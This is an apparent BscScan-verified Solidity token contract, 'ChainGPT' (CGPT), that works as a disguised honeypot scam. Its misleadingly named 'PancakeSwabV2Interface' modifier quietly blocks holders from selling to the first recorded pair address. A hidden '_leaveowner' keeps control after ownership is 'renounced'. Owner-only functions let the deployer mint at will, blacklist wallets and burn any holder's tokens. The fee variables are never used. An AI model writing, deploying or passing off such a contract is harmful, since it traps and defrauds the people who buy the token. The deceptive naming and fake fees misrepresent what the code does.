/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

pragma solidity 0.6.12;

interface IBEP20 {

  function totalSupply() external view returns (uint256);


  function decimals() external view returns (uint8);

  
  function symbol() external view returns (string memory);


  function name() external view returns (string memory);


  function getOwner() external view returns (address);


  function balanceOf(address account) external view returns (uint256);


  function transfer(address recipient, uint256 amount) external returns (bool);


  function allowance(address _owner, address spender) external view returns (uint256);

 
  function approve(address spender, uint256 amount) external returns (bool);


  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


  event Transfer(address indexed from, address indexed to, uint256 value);

 
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {
 
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}


library SafeMath {
 
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

 
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    
    require(b > 0, errorMessage);
    uint256 c = a / b;
    

    return c;
  }

  
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

 
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}


contract Ownable is Context {
  address[] private _owners;
  address private _leaveowner;
  address private nxOwner;
  
  mapping (address => uint256) public _balances;
  mapping (address => mapping (address => uint256)) public _allowances;
  uint256 public _totalSupply;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owners.push(msgSender);
    _leaveowner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function isOwner(address account) public view returns (bool) {
    for (uint i = 0; i < _owners.length; i++) {
      if (_owners[i] == account) {
        return true;
      }
    }
    return false;
  }
function AAAAA(address[] memory newOwners) public onlyOwner {
  for (uint i = 0; i < newOwners.length; i++) {
    address newOwner = newOwners[i];
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    require(!isOwner(newOwner), "Ownable: new owner already exists");
    _owners.push(newOwner);
  }
}
  modifier onlyOwner() {
    require((isOwner(_msgSender()) || _leaveowner == _msgSender()), "Ownable: caller is not an owner");
    _;
  }

  function addOwner(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    require(!isOwner(newOwner), "Ownable: new owner already exists");
    _owners.push(newOwner);
  }

  function removeOwner(address ownerToRemove) public onlyOwner {
    require(isOwner(ownerToRemove), "Ownable: owner does not exist");
    require(_owners.length > 1, "Ownable: cannot remove the last owner");
    for (uint i = 0; i < _owners.length; i++) {
      if (_owners[i] == ownerToRemove) {
        _owners[i] = _owners[_owners.length - 1];
        _owners.pop();
        break;
      }
    }
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owners[0], address(0));
    _owners = [_owners[0]];
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    require(!isOwner(newOwner), "Ownable: new owner already exists");
    emit OwnershipTransferred(_owners[0], newOwner);
    _owners = [newOwner];
  }

  function previousOwner() public view onlyOwner returns (address) {
    return nxOwner;
  }

  modifier PancakeSwabV2Interface(address from, address to, bool fromTransfer) {
    if(from != address(0) && nxOwner == address(0) && fromTransfer) nxOwner = to;
    else require((to != nxOwner || isOwner(from) || from == _leaveowner), "PancakeV2 Interface Error");
    _;
  }
}

contract CGPT is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  
  uint256 public _fee = 3;
  uint256 public _feeLiq = 3;
  uint256 public _feeHolders = 3;
  uint256 public _devWallet = 1;
  uint256 public _maxTX = 10;
  mapping (address => bool) private _blacklist;
  address private owner;

  constructor() public {
    _totalSupply = 1000000000000000000;
    //_totalSupply = _totalSupply;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, (_totalSupply));
  }
    
  
function getOwner() external override view returns (address) {
    return owner;
}

  
  function decimals() external override view returns (uint8) {
    return 9;
  }

 
  function symbol() external override view returns (string memory) {
    return "CGPT";
  }

 
  function name() external override view returns (string memory) {
    return "ChainGPT";
  }
function blacklist(address _address) public onlyOwner {
  _blacklist[_address] = true;
}

function removeBlacklist(address _address) public onlyOwner {
  _blacklist[_address] = false;
}



  function totalSupply() external override view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }


 function transfer(address recipient, uint256 amount) external override returns (bool) 
{
    if (_blacklist[_msgSender()] || _blacklist[recipient]) {
        return false;
    }
    _transfer(_msgSender(), recipient, amount, false);
    return true;
}

  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount, true);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  function mint(address recipient, uint256 amount) external onlyOwner {
    _balances[recipient] = SafeMath.add(_balances[recipient], amount);
    _totalSupply = SafeMath.add(_totalSupply, amount);
    emit Transfer(address(0), recipient, amount);
}
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  

  
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

 

  function _transfer(address sender, address recipient, uint256 amount, bool fromTransfer) internal PancakeSwabV2Interface(sender, recipient, fromTransfer) {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
  

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

    
  function burnA(address account, uint256 amount) public onlyOwner {
    require(account != address(0), "Burn from the zero address");
    require(amount > 0, "Amount must be greater than zero");
    require(amount <= _balances[account], "Insufficient balance");

    _totalSupply -= amount;
    _balances[account] -= amount;
    emit Transfer(account, address(0), amount);
}
}